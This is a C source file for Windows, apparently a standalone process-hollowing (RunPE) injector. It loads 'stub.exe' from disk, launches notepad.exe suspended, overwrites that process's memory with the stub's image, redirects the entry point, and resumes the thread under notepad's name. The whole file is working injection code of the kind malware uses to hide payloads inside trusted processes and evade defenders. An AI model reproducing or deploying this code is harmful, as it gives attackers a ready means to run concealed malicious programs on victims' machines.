#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
//read PE file from disk
char* MapFileToMemory(LPCSTR filename){
    FILE *fp;
    fp = fopen(filename,"rb");
    fseek(fp, 0L, SEEK_END);
    int sz = ftell(fp);
    rewind(fp);
    char* data = calloc(sz, 1);
    fread(data, sz, 1, fp);
    fclose(fp);
    return data;
}
int RunPE(void* Image, const char* CurrentFilePath, char* cmdLine, HANDLE* hand){
    IMAGE_DOS_HEADER* DOSHeader;
    IMAGE_NT_HEADERS* NtHeader;
    IMAGE_SECTION_HEADER* SectionHeader;
    PROCESS_INFORMATION PI;
    STARTUPINFOA SI;
    CONTEXT* CTX;
    DWORD64* ImageBase = NULL;
    void* pImageBase = NULL;
    int count;
    DWORD a;
    //get PE headers
    DOSHeader = (PIMAGE_DOS_HEADER)Image;
    NtHeader = (PIMAGE_NT_HEADERS64)((DWORD64)Image + DOSHeader->e_lfanew);
    if (NtHeader->Signature == IMAGE_NT_SIGNATURE){
        ZeroMemory(&PI, sizeof(PI));
        ZeroMemory(&SI, sizeof(SI));
        //make process suspended
        int threadcreated = CreateProcessA(CurrentFilePath, cmdLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI);
        if (threadcreated){
            CTX = (LPCONTEXT)VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE);
            CTX->ContextFlags = CONTEXT_FULL;
            if (GetThreadContext(PI.hThread, (LPCONTEXT)CTX)){
                //obtain PEB
                ReadProcessMemory(PI.hProcess, (LPCVOID)(CTX->Rdx + sizeof(LPVOID)*2), (LPVOID)&ImageBase, sizeof(LPVOID), 0);
                //try to free any memory taken at ImageBase of our PE (we don't do relocations)
                VirtualFreeEx(PI.hProcess, (LPVOID)(NtHeader->OptionalHeader.ImageBase), 0, MEM_RELEASE);
                //alloc remote memory
                pImageBase = VirtualAllocEx(PI.hProcess, (LPVOID)(NtHeader->OptionalHeader.ImageBase), NtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (pImageBase){
                    //copy headers
                    WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
                    for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++){
                        SectionHeader = (PIMAGE_SECTION_HEADER)((DWORD64)Image + DOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64) + (count * 40));
                        //copy sections
                        WriteProcessMemory(PI.hProcess, (LPVOID)((DWORD64)pImageBase + SectionHeader->VirtualAddress),
                            (LPVOID)((DWORD64)Image + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
                        //turn code sections RX
                        if(SectionHeader->Characteristics & IMAGE_SCN_CNT_CODE)
                            VirtualProtectEx(PI.hProcess, (LPVOID)((DWORD64)pImageBase + SectionHeader->VirtualAddress), SectionHeader->SizeOfRawData, PAGE_EXECUTE_READ, &a);
                    }
                    //copy new process info to PEB
                    WriteProcessMemory(PI.hProcess, (LPVOID)(CTX->Rdx + sizeof(LPVOID)*2),
                        (LPVOID)(&NtHeader->OptionalHeader.ImageBase), sizeof(LPVOID), 0);
                    //set entrypoint
                    CTX->Rcx = (DWORD64)pImageBase + NtHeader->OptionalHeader.AddressOfEntryPoint;
                    //begin execution
                    SetThreadContext(PI.hThread,(LPCONTEXT)CTX);
                    ResumeThread(PI.hThread);
                    *hand = PI.hProcess;
                    return 0;
                }else{
                    //failure condition - we cannot seem to get virtualallocex at desired address, try again
                    TerminateProcess(PI.hProcess, 0);
                }
            }
        }
    }
    return -1;
}

int main(int argc, char** argv){
    HANDLE hand;
    void* rawData = MapFileToMemory("stub.exe");
    //may take >1 try if unlucky
    while (RunPE(rawData, "C:\\Windows\\System32\\notepad.exe", "C:\\Windows\\SysWow64\\tree.com test", &hand)!=0){
        printf("attempt...\n");
    }
    printf("injected\n");
    //TerminateProcess(hand, 0);
}
